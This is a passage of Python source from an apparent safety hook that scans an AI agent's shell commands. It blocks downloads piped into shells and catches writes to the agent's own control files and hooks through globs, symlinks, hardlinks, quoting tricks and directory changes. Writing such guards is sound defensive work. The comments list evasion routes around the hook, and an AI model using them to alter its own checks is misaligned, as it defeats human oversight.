            return False
    return False


def _chain_verdict(chain: List[str]) -> Optional[Tuple[str, str]]:
    """The verdict on the producers (first stage last in ``chain``) of a program-reading consumer."""
    if _HERE_STRING_RE.search(chain[-1]) or "<<" in chain[-1] or _echoes_its_text(chain[-1]):
        return None
    if any(_is_fetch_head(s) for s in chain):
        return "block", "a downloaded program is piped straight into a shell/interpreter"
    return "ask", "a program is piped into a shell from a producer nothing can read"


def _is_fetch_head(stage: str) -> bool:
    words = _ind_program_words(stage)
    return bool(words) and os.path.basename(words[0]) in _FETCH_PROGRAMS


_PROCSUB_CONSUMER_RE = re.compile(
    r"(?:^|[;&|\n(]|&&|\|\|)\s*(?:(?:sudo|doas|exec)\s+(?:-\w+\s+)*)?(?:[\w/.-]*/)?"
    r"(?:sh|bash|zsh|dash|ksh|\.|source)\s+(?:-[A-Za-z]+\s+)*<\(((?:[^()]|\([^()]*\))*)\)"
)


def fed_program_verdict(command: str, _depth: int = 0) -> Optional[Tuple[str, str]]:
    """``("block"|"ask", why)`` for a pipe whose reader runs a program a producer the scanner cannot read writes.

    ``echo`` / ``printf`` / heredoc / here-string feeds are READ (``_eval_fed_programs``) and judged
    as commands; anything else is text nothing here can see. A download piped to a shell is the
    classic remote-code-run, blocked; a file or another command's output is a confirm. The
    command's ``-c`` / ssh payloads are walked too: wrapping it in a shell changes nothing.
    """
    if _depth > _RESCAN_DEPTH:
        return None
    verdict: Optional[Tuple[str, str]] = None
    for m in _PROCSUB_CONSUMER_RE.finditer(command):
        found = _chain_verdict([s for _op, s in _pipe_stages(m.group(1))][::-1] or [m.group(1)])
        if found and found[0] == "block":
            return found
        verdict = verdict or found
    if "|" in command:
        stages = _pipe_stages(_hide_heredoc_bodies(command, keep_programs=False))
        for k, (op, stage) in enumerate(stages):
            if op != "|" or not _stdin_program_consumer(stage):
                continue
            chain = []
            j = k - 1
            while j >= 0:
                chain.append(stages[j][1])
                if stages[j][0] != "|":
                    break
                j -= 1
            found = _chain_verdict(chain) if chain else None
            if found and found[0] == "block":
                return found
            verdict = verdict or found
    for payload in _shell_payloads(command):
        found = fed_program_verdict(payload, _depth + 1)
        if found and found[0] == "block":
            return found
        verdict = verdict or found
    return verdict


_REDIRECT_SPELLINGS = (
    (_rx(r"&>>"), ">>"),
    (_rx(r"&>"), ">"),
    (_rx(r"(\d*)>\|"), r"\1>"),
    (_rx(r"(\d*)>&(?![\d\-])"), r"\1>"),
    (_rx(r"<>"), ">"),
)


def _redirect_variant(command: str) -> List[str]:
    """``>|``, ``>&``, ``&>``, ``<>`` spelled as a plain ``>`` (#1101).

    The masked ladder splits subcommands on ``|`` and ``&``, so ``echo x >| f``
    reads as ``echo x >`` and a lone ``f`` and the write target is lost. They
    are the same write as ``>``; the plain spelling is scanned as well.
    """
    out = command
    for rx, repl in _REDIRECT_SPELLINGS:
        out = rx.sub(repl, out)
    return [out] if out != command else []


_PATH_ODDITY = _rx(r"(?<![^\s'\"`;|&<>()])[^\s'\"`;|&<>()]*(?://|/\./|/\.\./|/\.(?=[\s'\"`;|&<>()]|$)|/\.\.(?=[\s'\"`;|&<>()]|$))[^\s'\"`;|&<>()]*")


def _normalized_path_variant(command: str) -> List[str]:
    """The command with ``//``, ``/./`` and ``/../`` collapsed inside path words (#1101)."""
    def _norm(m: "re.Match[str]") -> str:
        tok = re.sub(r"/{2,}", "/", m.group(0))
        return posixpath.normpath(tok) if tok not in ("/", "") else tok

    out = _PATH_ODDITY.sub(_norm, command)
    return [out] if out != command else []


def _brace_variants_of(command: str) -> List[str]:
    """Every brace expansion of the command (``damagecontrol.y{m,x}l``) (#1101).

    A group count that outgrows the cap is not expanded — declared residual.
    """
    if "{" not in command:
        return []
    return brace_variants(command) or []


_GLOB_RUN = _rx(r"[^\s'\"`;|&<>()]+")
_GLOB_MARK = _rx(r"[*?\[]|\$(?:\w|\{)")
_NOT_WORD_OR_DOLLAR = _rx(r"[^\w$]")
_WORD_OR_DOLLAR = _rx(r"[\w$'\"]")


def _glob_tokens(command: str) -> "Iterator[str]":
    """Each unquoted word holding a glob / expansion mark, from where a word may start (#1132).

    One linear pass over the word runs. A single regex of the form
    ``[^delims]*(?:mark)[^delims]*`` retries from every offset of a long run
    that holds no mark, which made a 20 KB run of ``../`` or ``\\`` cost seconds
    (#1111). The result is the same text: a word preceded by a word character,
    ``$`` or a quote starts at its first character after a non-word one.
    """
    for m in _GLOB_RUN.finditer(command):
        run, begin = m.group(0), m.start()
        start = 0
        if begin and _WORD_OR_DOLLAR.match(command[begin - 1]):
            gap = _NOT_WORD_OR_DOLLAR.search(run)
            if gap is None:
                continue
            start = gap.start() + 1
        if _GLOB_MARK.search(run, start):
            yield run[start:]
_EXPANSION = _rx(r"\$(?:\w+|\{[^}]*\})")
_GLOB_PATH_CAP = 32


@functools.lru_cache(maxsize=8)
def _protected_glob_candidates(home: str) -> Tuple[Tuple[str, ...], Tuple[str, ...]]:
    """``(concrete_paths, project_scoped_basenames)`` a glob token may stand for."""
    concrete: List[str] = []
    project: List[str] = []
    for pat in PROTECTED_CONTROL_PLANE_PATHS:
        if pat.startswith("*"):
            project.append(pat[1:])
        else:
            concrete.append(os.path.expanduser(pat).replace("*", "x"))
    return tuple(concrete), tuple(project)


def _token_regex(tok: str) -> Optional["re.Pattern[str]"]:
    """Shell-glob semantics for one path word; ``$x`` stands for any run of non-``/``.

    None when a path component is nothing but an unresolvable expansion
    (``$d/…``, ``~/.agentwire/$f``): that is the declared runtime-built
    residual, because it would stand for every file in the directory.
    """
    for comp in tok.split("/"):
        if _EXPANSION.search(comp) and not _EXPANSION.sub("", comp):
            return None
    out: List[str] = []
    i = 0
    while i < len(tok):
        c = tok[i]
        m = _EXPANSION.match(tok, i)
        if m:
            out.append("[^/]*")
            i = m.end()
            continue
        if c == "*":
            out.append("[^/]*")
        elif c == "?":
            out.append("[^/]")
        elif c == "[" and tok.find("]", i + 2) != -1:
            j = tok.find("]", i + 2)
            body = tok[i + 1 : j]
            out.append("[" + ("^" + body[1:] if body[:1] in "!^" else body).replace("\\", "\\\\") + "]")
            i = j
        else:
            out.append(re.escape(c))
        i += 1
    try:
        return _rx("".join(out))
    except re.error:
        return None


def _glob_variants(command: str) -> List[str]:
    """Commands with each unquoted glob / partial-expansion word replaced by a protected path it can name (#1101).

    Stance: the shell expands ``damage*.yml`` or ``damage$x.yml`` to whatever
    exists, so the word is matched (shell-glob semantics) against the concrete
    protected paths — and against the real directory listing — and each hit is
    substituted back, so the VERB decides (``rm ~/.agentwire/*`` is refused,
    ``ls ~/.agentwire/damage*`` is not). A bare relative glob needs a literal
    run of 3+ characters (``rm *`` names nothing in particular). A component
    that is only an expansion (``~/.agentwire/$f``) stays a declared residual.
    """
    tokens = list(_glob_tokens(command))
    if not tokens:
        return []
    _, project = _protected_glob_candidates(os.path.expanduser("~"))
    out: List[str] = []
    for tok in tokens:
        if tok.startswith("/"):
            hits = _glob_hits(tok)
        else:
            rx = _token_regex(tok)
            hits = []
            if rx is not None and re.search(
                r"[A-Za-z0-9_.\-]{3,}", _EXPANSION.sub("", re.sub(r"\[[^\]]*\]|[*?\[\]]", " ", tok))
            ):
                hits = [p for p in project if rx.fullmatch(p) or rx.fullmatch("x" + p)]
        for hit in hits:
            out.append(command.replace(tok, hit))
    return out


def _glob_hits(tok: str) -> List[str]:
    """Protected paths an ABSOLUTE glob / partial-expansion word can name (#1101)."""
    rx = _token_regex(tok)
    if rx is None:
        return []
    concrete, _ = _protected_glob_candidates(os.path.expanduser("~"))
    hits = [c for c in concrete if rx.fullmatch(c)]
    if "/" in tok[1:] and not re.search(r"[*?\[$]", tok.split("/")[1]):
        hits += [
            f for f in itertools.islice(glob.iglob(_EXPANSION.sub("*", tok)), _GLOB_PATH_CAP)
            if is_protected_control_plane(f) and f not in hits
        ]
    return hits


# A command's start: line start or after a separator / reserved word, then any
# wrappers and ``VAR=value`` prefixes. A prefix value may hold whitespace inside
# ``${…}`` / quotes (``A=${x:-\n} cd dir``), which a bare ``\S*`` cut short.
_CMD_START = (
    r"(?:^\s*|(?:\b(?:then|do|else|elif|if|while|until|time|coproc)\b|[;&|\n(){!])\s*)"
    r"(?:(?:time|nohup|command|builtin|env|exec|sudo|!|\w+=(?:\$\{[^}]*\}|\"[^\"]*\"|'[^']*'|[^\s\"'$;&|()]|\$)*)\s+(?:-\S+\s+)*)*"
)
# ``cd dir >/dev/null 2>&1 &&``: redirects between the target and the separator
_CD_REDIRECTS = r"(?:\s+(?:\d*|&)(?:>>?|<&?|>&|>\|)\s*[^\s;&|()<>]+)*"
_CD_RE = _rx(
    _CMD_START
    + r"(?:cd|pushd)\s+(?:--\s+)?(?P<d>\"[^\"]*\"|'[^']*'|[^\s;&|()<>]+)" + _CD_REDIRECTS + r"\s*(?=&&|;|\|\||\n)"
)
# ``popd`` returns to a directory the command cannot see: an unresolvable cwd.
_POPD_RE = _rx(_CMD_START + r"popd\b[^\n;&|()]*\s*(?=&&|;|\|\||\n)")
_REL_WORD = _rx(r"(?<![^\s;&|(<>'\"=])([A-Za-z0-9_.][^\s;&|()'\"<>]*)")


def _join_dir(cwd: Optional[str], d: str) -> Optional[str]:
    """``d`` resolved against ``cwd`` (``~`` is the home dir); None when it depends on an unknown cwd."""
    if d == "~" or d.startswith("~/"):
        d = os.path.expanduser("~") + d[1:]
    if d.startswith("/"):
        return posixpath.normpath(d)
    return posixpath.normpath(posixpath.join(cwd, d)) if cwd else None


_ANSI_C = _rx(r"\$'((?:[^'\\]|\\.)*)'")
_OPT_VALUE = _rx(r"((?:-{1,2})?[A-Za-z][\w-]*=)(.+)")
_PLAIN_WORD = _rx(r"[A-Za-z0-9_.][^\s;&|()<>'\"]*")
_PUNCT_WORD = _rx(r"[;&|<>()]+")


def _ansi_c_fold(text: str) -> str:
    """``$'dama\\x67e'`` -> the quoted string bash would produce."""
    def _dec(m: "re.Match[str]") -> str:
        try:
            return shlex.quote(codecs.decode(m.group(1), "unicode_escape"))
        except (UnicodeDecodeError, ValueError):
            return m.group(0)

    return _ANSI_C.sub(_dec, text)


def _resolve_word(word: str, cwd: str) -> str:
    """``word`` (already unquoted) made absolute when it names a protected file under ``cwd``."""
    opt = _OPT_VALUE.fullmatch(word)
    if opt:  # of=<file>, --output=<file>, --output-document=<file>, -o=<file>
        return opt.group(1) + _resolve_word(opt.group(2), cwd)
    if word.startswith("-"):
        return word
    if _PLAIN_WORD.fullmatch(word):
        joined = posixpath.normpath(posixpath.join(cwd, word))
        if re.search(r"[*?\[]", word):
            hits = _glob_hits(joined)
            return hits[0] if hits else word
        return joined if is_protected_control_plane(joined) else word

    def _sub(m: "re.Match[str]") -> str:  # a word with quotes inside (python -c "open('x')")
        cand = posixpath.normpath(posixpath.join(cwd, m.group(1)))
        return cand if is_protected_control_plane(cand) else m.group(0)

    return _REL_WORD.sub(_sub, word)


def _absolutize(text: str, cwd: str) -> str:
    """Rewrite words in ``text`` that name a protected file under ``cwd``.

    The text is first folded through what the shell does to a word before the
    program sees it — ANSI-C ``$'…'``, ``$PWD``, adjacent quotes, backslashes —
    so the relative spelling reaches the same check the absolute one does.
    """
    folded = _ansi_c_fold(text).replace("${PWD}", cwd).replace("$PWD", cwd)
    try:
        lex = shlex.shlex(folded, posix=True, punctuation_chars=True)
        lex.whitespace_split = True
        words = list(lex)
    except ValueError:
        return _REL_WORD.sub(
            lambda m: _resolve_word(m.group(1), cwd), folded
        )
    resolved = [w if _PUNCT_WORD.fullmatch(w) else _resolve_word(w, cwd) for w in words]
    if resolved == words and folded == text:
        return text
    return " ".join(w if _PUNCT_WORD.fullmatch(w) else _quote_word(w) for w in resolved)


_ASSIGN_STMT = _rx(
    r"(?:^|[;&|\n({]|\b(?:then|do|else))[ \t]*(?:(?:export|local|declare|readonly)[ \t]+)?(?P<n>[A-Za-z_]\w*)=(?P<v>(?:'[^']*'|\"[^\"]*\"|[^\s;&|()<>'\"])*)(?=[ \t]*(?:[;&|\n]|$))"
)
_VAR_REF = _rx(r"\$(?:(?P<a>[A-Za-z_]\w*)|\{(?P<b>[A-Za-z_]\w*)\})")


def _literal_vars(prefix: str) -> Dict[str, Optional[str]]:
    """``NAME=value`` statements in ``prefix``: the literal value, or None when it is computed.

    The last assignment wins, so a later ``d=$(…)`` makes ``d`` unknown again.
    """
    out: Dict[str, Optional[str]] = {}
    for m in _ASSIGN_STMT.finditer(prefix):
        lit = re.sub(r"['\"]", "", m.group("v"))
        out[m.group("n")] = None if re.search(r"[$`]", lit) else lit
    return out


def _expand_literal_vars(text: str, known: Dict[str, Optional[str]]) -> str:
    """``text`` with each ``$name`` / ``${name}`` a same-command literal assignment defines replaced."""
    def _sub(m: "re.Match[str]") -> str:
        val = known.get(m.group("a") or m.group("b"))
        return m.group(0) if val is None else val

    return _VAR_REF.sub(_sub, text)


# Options that make the command run in another directory, per command word:
# ``(short options, long options, stop-at-first-operand)``. ``git -C`` / ``env
# -C`` / ``patch -d`` change the cwd of the command itself, which is what a
# relative operand (or a diff's own target paths) is resolved against.
_CHDIR_OPTIONS = {
    "git": (("-C",), ("--work-tree",), False),
    "env": (("-C",), ("--chdir",), True),
    "patch": (("-d",), ("--directory",), False),
}
_CHDIR_HINT = _rx(
    r"\bgit\b[^\n]*(?:\s-C\b|--work-tree)|\benv\b[^\n]*(?:\s-[A-Za-z]*C|--chdir)|\bpatch\b[^\n]*(?:\s-d|--directory)"
)


_ENV_CLUSTER = _rx(r"-[A-Za-z]+C")
_GROUP_WORDS = frozenset({"{", "}", "!", "then", "do", "else", "elif", "if", "while", "until", "time", "fi", "done"})


def _segment_words(seg: str) -> List[str]:
    """Words of one simple command, without the group / reserved words around it."""
    words = _words(seg)
    while words and words[0] in _GROUP_WORDS:
        words = words[1:]
    while words and words[-1] in _GROUP_WORDS:
        words = words[:-1]
    return words


_UNESCAPE_DQ = _rx(r"\\([$`])")
_SHELL_C_FLAG = _rx(r"-[A-Za-z]*c[A-Za-z]*")


# Options that take a SEPARATE value, per wrapper. An attached value (``-n5``,
# ``--adjustment=5``, ``-uroot``) is one word and consumes nothing; a separate one
# (``-n 5``) must not be mistaken for the command. A wrapper not listed has no
# value-taking option here.
_WRAPPER_VALUE_OPTS = {
    "nice": {"-n", "--adjustment"},
    "ionice": {"-c", "-n", "-p", "-P", "-u", "--class", "--classdata", "--pid", "--pgid", "--uid"},
    "timeout": {"-s", "-k", "--signal", "--kill-after"},
    "env": {"-u", "-C", "-S", "--unset", "--chdir", "--split-string"},
    "sudo": {"-u", "-g", "-h", "-p", "-C", "-D", "-R", "-T", "-U", "-r", "-t", "--user", "--group", "--host", "--prompt", "--chdir", "--role", "--type"},
    "doas": {"-u", "-C"},
    "stdbuf": {"-i", "-o", "-e", "--input", "--output", "--error"},
    "taskset": {"-c", "--cpu-list"},
    "chrt": set(),
    "xargs": {"-n", "-I", "-L", "-P", "-s", "-d", "-E", "-a", "--max-args", "--replace", "--max-procs", "--delimiter", "--arg-file"},
    "time": {"-f", "-o", "--format", "--output"},
    "parallel": {"-j", "-n", "-N", "-S", "-a", "--jobs", "--sshlogin", "-I"},
    "sshpass": {"-p", "-f", "-d", "-P"},
}
_POSITIONAL_ARG = _rx(r"\d+[smhd]?|0[xX][0-9a-fA-F]+")


def _wrapped_command_index(words: List[str]) -> Optional[int]:
    """Index of the word that is the command, past prefix wrappers, their options and ``VAR=x``.

    ``sudo -u root timeout -s9 5 nice -n5 patch`` -> ``patch``. The one place
    that knows which words keep the command position open
    (``_POSITION_WRAPPERS`` + ``_PREFIX_WRAPPERS``) and which of their options
    take a separate value (``_WRAPPER_VALUE_OPTS``).
    """
    wrappers = _POSITION_WRAPPERS | _PREFIX_WRAPPERS
    current = ""
    skip_value = False
    for i, w in enumerate(words):
        if skip_value:
            skip_value = False
        elif os.path.basename(w) in wrappers:
            current = os.path.basename(w)
        elif _ASSIGN_TOKEN_RE.match(w) or _POSITIONAL_ARG.fullmatch(w):
            continue
        elif w.startswith("-"):
            takes = _WRAPPER_VALUE_OPTS.get(current, ())
            # ``-n`` / ``--adjustment`` exactly, or a short cluster ending in a
            # value option (``env -iC dir``); ``-n5`` / ``--adjustment=5`` carry theirs
            skip_value = w in takes
            if not skip_value and len(w) > 2 and w[1] != "-":
                # a cluster: the first value-taking letter ends it, and takes the
                # NEXT word only when it is the last letter (``-iC dir``, not ``-uroot``)
                for k, ch in enumerate(w[1:], 1):
                    if "-" + ch in takes:
                        skip_value = k == len(w) - 1
                        break
        else:
            return i
    return None


def _wrapper_payload_commands(command: str) -> List[str]:
    """Programs a command hands to a shell or ``ssh`` as one argument: ``sh -c '…'``, ``ssh host '…'``.

    The wrapped command is the command: the payload is re-scanned in its own
    right, so a ``cd <dir> && touch <file>`` inside it is resolved exactly as it
    is at the top level (the generators that read directories only recognise a
    ``cd`` at a command start, which a quote hides).
    """
    if not re.search(r"\b(?:sh|bash|zsh|dash|ksh|su|ssh)\b", command):
        return []
    segments, err = _scope_segments(command, grouping_ok=True)
    if err:
        return []
    out: List[str] = []
    for argv, _op in segments:
        _, words = _split_assignments(argv)
        words = [w for w in words if w not in _GROUP_WORDS]
        remote = _ssh_remote_payload(words)
        if remote:
            while remote.startswith("-") and " " in remote:
                remote = remote.split(" ", 1)[1]
            out.append(remote)
        i = _wrapped_command_index(words)
        if i is not None and os.path.basename(words[i]) in _SHELL_NAMES:
            for j in range(i + 1, len(words) - 1):
                if _SHELL_C_FLAG.fullmatch(words[j]):
                    k = j + 1
                    while k < len(words) - 1 and words[k] == "--":
                        k += 1
                    out.append(words[k])
                    break
    return [fixed for payload in out for fixed in (payload, _UNESCAPE_DQ.sub(r"\1", payload)) if fixed]


def _chdir_option_split(words: List[str]) -> Tuple[List[str], List[str]]:
    """``(directories, remaining words)`` for a command word that takes a chdir option."""
    start = 0
    while start < len(words) and _ASSIGN_WORD.match(words[start]):
        start += 1
    kind = os.path.basename(words[start]) if start < len(words) else ""
    if kind not in _CHDIR_OPTIONS:
        return [], words
    short, long_, stop_at_operand = _CHDIR_OPTIONS[kind]
    dirs: List[str] = []
    rest: List[str] = []
    i = 0
    while i < len(words):
        w = words[i]
        if i > start and (w in short or (kind == "env" and _ENV_CLUSTER.fullmatch(w))) and i + 1 < len(words):
            dirs.append(words[i + 1])
            i += 2
            continue
        if i > start and kind != "git" and w[:2] in short and len(w) > 2 and not w.startswith("--"):
            dirs.append(w[2:])
        elif i > start and any(w.startswith(o + "=") for o in long_):
            dirs.append(w.partition("=")[2])
        elif i > start and w in long_ and i + 1 < len(words):
            dirs.append(words[i + 1])
            i += 1
        else:
            if stop_at_operand and i > start and not w.startswith("-") and not _ASSIGN_WORD.match(w):
                rest = list(words[i:])
                break
            rest.append(w)
        i += 1
    return dirs, rest


def _cwd_scopes(command: str) -> Tuple[List[Tuple[str, str]], List[str]]:
    """``(known, unknown)`` for every place the command changes directory (#1101).

    ``known`` pairs a literal directory with the text that runs in it —
    ``cd <dir> &&`` (until the next ``cd``), ``git -C`` / ``--work-tree``,
    ``env -C`` / ``--chdir`` and ``patch -d`` — with ``d=<dir>; cd $d`` resolved
    through the same command's literal assignments. ``unknown`` holds the text
    that runs after a ``cd`` the command cannot resolve (``cd -``, ``popd``,
    ``cd $x`` with ``x`` set from a substitution or not at all).
    """
    known: List[Tuple[str, str]] = []
    unknown: List[str] = []
    if re.search(r"\b(?:cd|pushd|popd)\b", command):
        events = [(m.start(), m.end(), m.group("d").strip("'\"")) for m in _CD_RE.finditer(command)]
        events += [(m.start(), m.end(), "-") for m in _POPD_RE.finditer(command)]
        events.sort()
        cwd: Optional[str] = None
        for k, (start, stop, target) in enumerate(events):
            end = events[k + 1][0] if k + 1 < len(events) else len(command)
            rest = command[stop:end]
            target = _expand_literal_vars(target, _literal_vars(command[:start]))
            if target == "-" or re.search(r"[$`]", target):
                cwd = None
                unknown.append(rest)
                continue
            cwd = _join_dir(cwd, target)
            if cwd:
                known.append((cwd, rest))
            else:
                unknown.append(rest)
    if _CHDIR_HINT.search(command):
        for seg in re.split(r"[;&|\n()]", command):
            cwd = None
            rest = _segment_words(seg)
            for _ in range(4):  # ``env -C a env -C b cmd`` nests
                dirs, rest = _chdir_option_split(rest)
                if not dirs:
                    break
                for d in dirs:
                    cwd = _join_dir(cwd, d)
                if cwd is None:
                    break
            if cwd:
                known.append((cwd, " ".join(_quote_word(w) for w in rest)))
    return known, unknown


_PATH_WORD = _rx(r"(?<![^\s'\"`;|&<>()=])[^\s'\"`;|&<>()$*?\[\]{}]*[^\s'\"`;|&<>()$*?\[\]{}=-]")
_REALPATH_WORD_CAP = 64


@functools.lru_cache(maxsize=4)
def _protected_inodes(home: str) -> Tuple[Tuple[str, "os.stat_result"], ...]:
    """``(path, stat)`` of each concrete protected file that exists (hardlink detection)."""
    out = []
    for pat in PROTECTED_CONTROL_PLANE_PATHS:
        if is_glob_pattern(pat):
            continue
        path = os.path.expanduser(pat)
        try:
            out.append((path, os.stat(path)))
        except OSError:
            continue
    return tuple(out)


def _under_protected(path: str) -> bool:
    """Protected file, or a directory that holds / is inside one."""
    if is_protected_control_plane(path):
        return True
    for d in _protected_ancestor_dirs():
        e = os.path.expanduser(d)
        if path == e or path.startswith(e + "/"):
            return True
    return False


def _realpath_variants(command: str) -> List[str]:
    """The command with each path word that is an EXISTING alias of a protected file spelled as that file (#1101).

    The link was made by a separate command, an earlier turn, or someone else:
    by the time ``echo x > /tmp/l`` runs, its text names nothing protected. The
    hook can ask the filesystem. Every path word is resolved (a symlink anywhere
    in it, a directory alias like ``/tmp/d/damagecontrol.yml`` included, and a
    hardlink to a protected file); a word that lands on the control plane is
    rewritten to where it really goes and the result is scanned as the command
    it is.
    """
    out: List[str] = []
    seen = set()
    for m in itertools.islice(_PATH_WORD.finditer(command), _REALPATH_WORD_CAP):
        word = m.group(0)
        if word in seen or len(word) < 2:
            continue
        seen.add(word)
        target = _alias_target(os.path.expanduser(word))
        if target and target != os.path.expanduser(word):
            out.append(command.replace(word, _quote_word(target)))
    return out


def _alias_target(path: str) -> Optional[str]:
    """Where ``path`` really lands, when that is a protected file or directory it is only an alias of; else None."""
    try:
        if "/" not in path and not os.path.lexists(path):
            return None
        real = os.path.realpath(path)
        if real != posixpath.normpath(os.path.abspath(path)) and _under_protected(real):
            return real
        if os.path.isfile(path) and os.stat(path).st_nlink > 1:
            st = os.stat(path)
            return next((p for p, ps in _protected_inodes(os.path.expanduser("~")) if os.path.samestat(st, ps)), None)
    except (OSError, ValueError):
        pass
    return None


def _cwd_realpath_variants(command: str) -> List[str]:
    """``_realpath_variants`` for a relative word after a literal ``cd <dir> &&`` (#1065).

    ``cd /tmp/d && echo x > lnk`` names no path until the cwd is applied, and
    ``_cwd_variants`` only rewrites words that are lexically protected. The
    aliased word is resolved against the same cwd and judged as what it is.
    """
    out: List[str] = []
    for cwd, rest in _cwd_scopes(command)[0]:
        for m in itertools.islice(_PATH_WORD.finditer(rest), _REALPATH_WORD_CAP):
            word = m.group(0)
            if word.startswith(("/", "~", "-")) or len(word) < 2:
                continue
            target = _alias_target(posixpath.normpath(posixpath.join(cwd, word)))
            if target:
                out.append(rest.replace(word, _quote_word(target)))
    return out


def _cwd_variants(command: str) -> List[str]:
    """Relative operands resolved against a literal ``cd <dir> &&`` / ``git -C <dir>`` (#1101).

    ``cd ~/.agentwire && touch damagecontrol.yml`` names the file only relative
    to a directory set earlier in the same command. The literal directory is
    applied to later words (until the next ``cd``); each word that then names a
    protected file is rewritten to its absolute path and the result re-scanned.
    A directory that cannot be resolved is judged by ``unverifiable_target_verdict``.
    """
    return [
        new
        for cwd, rest in _cwd_scopes(command)[0]
        for new in (_absolutize(rest, cwd),)
        if new != rest
    ]


def _protected_dirs() -> List[str]:
    """Directories that hold a concrete protected file (``~/.agentwire``, ``~/.claude/hooks``, ...)."""
    dirs = {
        posixpath.dirname(os.path.expanduser(p))
        for p in PROTECTED_CONTROL_PLANE_PATHS
        if not p.startswith("*")
    }
    return sorted(dirs)


# Names that are control plane in ANY directory, or that no other program uses.
# ``settings.json`` / ``config.yaml`` are protected where they sit under
# ``~/.claude`` / ``~/.agentwire`` but are ordinary files everywhere else, so
# a bare one after a ``cd`` the scanner cannot read is not evidence of anything.
_GENERIC_BASENAMES = frozenset({"settings.json", "config.yaml"})
_PROJECT_PLACEHOLDER = "/hypothetical-project"


def _named_control_plane_files() -> List[Tuple[str, "frozenset[str]"]]:
    """``(directory, distinctive basenames)`` a bare name after an unreadable ``cd`` could mean."""
    by_dir: Dict[str, set] = {}
    for p in PROTECTED_CONTROL_PLANE_PATHS:
        if p.startswith("*"):
            d, name = _PROJECT_PLACEHOLDER, p[1:]
        elif is_glob_pattern(p):
            continue
        else:
            expanded = os.path.expanduser(p)
            d, name = posixpath.dirname(expanded), posixpath.basename(expanded)
        if name not in _GENERIC_BASENAMES:
            by_dir.setdefault(d, set()).add(name)
    return [(d, frozenset(names)) for d, names in sorted(by_dir.items())]


_INLINE_FLAG_RE = _rx(r'-[A-Za-z]*[ceE]|-r')  # ``-r`` is php's inline flag (ruby's is a require: see _inline_programs)
_INTERPRETER_START_RE = _rx(r'\b' + _INTERPRETERS + r'\b')
_INTERPRETER_NAME_RE = _rx(r'(?:' + _INTERPRETERS + r')')
# Words the program text uses for a control-plane directory or file, even when the
# path itself is assembled at run time (``'damage'+'control.yml'``, ``join(h, '.claude')``).
_CONTROL_PLANE_WORDS = (".agentwire", ".claude", "damagecontrol", "settings.json")
# Directories under those names that agents write by design — matched on a whole path segment.
_BENIGN_PATH_RE = _rx(r'(?:^|/)\.claude/projects/[^/]+/memory(?:/|$)|(?:^|/)\.agentwire/(?:wiki|artifacts)(?:/|$)')
# The ONE expression shape the exemption covers: a single string literal, optionally
# the sole argument of ``expanduser`` / ``Path``. Anything else (a variable, a join, ``+``,
# ``os.pardir``, a call) is not a path the scan can read, so it is not exempt.
_STATIC_PATH_RES = (
    _rx(r'''\s*['"]([^'"\\$@#]*)['"]\s*'''),
    _rx(r'''\s*(?:os\.path\.)?expanduser\(\s*['"]([^'"\\$@#]*)['"]\s*\)\s*'''),
    _rx(r'''\s*(?:pathlib\.)?Path\(\s*['"]([^'"\\$@#]*)['"]\s*\)\s*'''),
)
_CHDIR_RE = _rx(r'\bchdir\s*\(')
_CALL_RE = _rx(r'([A-Za-z_]\w*)\s*\(')
# one plain string (a double-quoted one with ``$``/``@``/``#{`` interpolates: not literal)
_LITERAL_ARG_RE = _rx(r'''\s*(?:'[^']*'|"[^"$@#\\]*")\s*''')
_PLAIN_RECEIVER_RE = _rx(r'''[\w.$:]*''')
# A call whose FIRST argument is the path (or the command line, for the runners).
_PATH_FIRST_SINKS = frozenset({
    "system", "popen", "popen2", "popen3", "Popen", "run", "call", "check_call", "check_output",
    "unlink", "unlinkSync", "remove", "rmtree", "rmSync", "chmod", "chown", "truncate",
    "writeFile", "writeFileSync", "appendFile", "appendFileSync", "file_put_contents", "createWriteStream",
    "exec", "execv", "execve", "execl", "execlp", "execvp", "spawn", "spawnSync", "execSync", "execFile",
})
# A call whose EVERY argument is a path (two ends).
_PATH_ALL_SINKS = frozenset({
    "copy", "copy2", "copyfile", "copytree", "copyFile", "copyFileSync", "move", "rename", "renameSync",
    "replace", "symlink", "symlinkSync", "link", "linkSync",
})
# A method whose path is its RECEIVER (``Path(...).write_text``); the arguments are data.
_RECEIVER_SINKS = frozenset({
    "write_text", "write_bytes", "touch", "unlink", "symlink_to", "hardlink_to", "rename", "replace", "chmod",
})
_FILE_CLASSES = frozenset({"File", "IO", "fs", "Files", "FileUtils"})
# Calls that open a path and write only in a write mode / flag (path first, mode second).
_OPEN_NAMES = frozenset({"open", "fopen", "openSync", "new"})
# Archive extraction: the destination is an argument, whatever the receiver (``tar.extractall(d)``).
_EXTRACT_SINKS = frozenset({"extractall", "extract", "unpack_archive"})
# ``var.replace(a, b)`` / ``items.remove(x)`` are string and list methods: a path-taking name
# called on a plain identifier counts only when that identifier is a module (``os.replace``).
_SINK_MODULES = frozenset({
    "os", "shutil", "subprocess", "fs", "promises", "child_process", "cp", "FileUtils", "File", "IO",
    "Kernel", "Open3", "posix", "Files", "pathlib", "commands", "io", "codecs", "gzip", "bz2", "lzma",
    "tarfile", "zipfile", "builtins",
})
_INDIRECT_RE = _rx(r'\b(?:getattr|__import__|importlib|eval|exec)\s*\(')


def _match_close(text: str, i: int) -> int:
    """Index of the bracket closing ``text[i]``, quotes respected; -1 when unbalanced."""
    depth, quote, j = 0, "", i
    while j < len(text):
        ch = text[j]
        if quote:
            if ch == "\\":
                j += 2
                continue
            if ch == quote:
                quote = ""
        elif ch in "'\"":
            quote = ch
        elif ch in "([{":
            depth += 1
        elif ch in ")]}":
            depth -= 1
            if depth == 0:
                return j
        j += 1
    return -1


def _split_args(inner: str) -> List[str]:
    args, cur, depth, quote, j = [], [], 0, "", 0
    while j < len(inner):
        ch = inner[j]
        if quote:
            cur.append(ch)
            if ch == "\\" and j + 1 < len(inner):
                j += 1
                cur.append(inner[j])
            elif ch == quote:
                quote = ""
        elif ch in "'\"":
            quote = ch
            cur.append(ch)
        elif ch in "([{":
            depth += 1
            cur.append(ch)
        elif ch in ")]}":
            depth -= 1
            cur.append(ch)
        elif ch == "," and depth == 0:
            args.append("".join(cur))
            cur = []
        else:
            cur.append(ch)
        j += 1
    args.append("".join(cur))
    return [a for a in args if a.strip()]


def _receiver_before(text: str, dot: int) -> str:
    """The expression a ``.method(`` is called on: ``(Path.home()/'x')``, ``Path('x')``, ``os.path``."""
    pos = dot
    for _ in range(8):
        k = pos
        while k > 0 and text[k - 1].isspace():
            k -= 1
        if k > 0 and text[k - 1] in ")]":
            depth, m = 0, k - 1
            while m >= 0:
                if text[m] in ")]}":
